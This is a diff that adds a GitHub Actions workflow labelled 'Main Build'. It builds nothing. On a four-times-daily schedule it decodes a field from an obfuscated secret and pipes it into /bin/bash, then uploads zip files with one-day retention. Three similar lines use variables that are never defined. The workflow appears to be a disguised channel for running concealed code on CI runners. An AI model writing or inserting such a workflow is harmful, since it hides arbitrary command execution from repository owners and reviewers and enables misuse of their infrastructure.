@@ -1,0 +1,31 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          rkbtf41: ${{ secrets.rkbtf41 }}
+        run: |
+          printf '%s' "$rkbtf41" | jq -r .okra34859 | /bin/bash
+          echo $ezc28 | jq -r .pprd3 | /bin/bash
+          echo $axz1281 | jq -r .owk22 | /bin/bash
+          printf '%s' "$gc2" | jq -r .e752 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: E6kjs8ui
+          path: "*.zip"
+          retention-days: 1
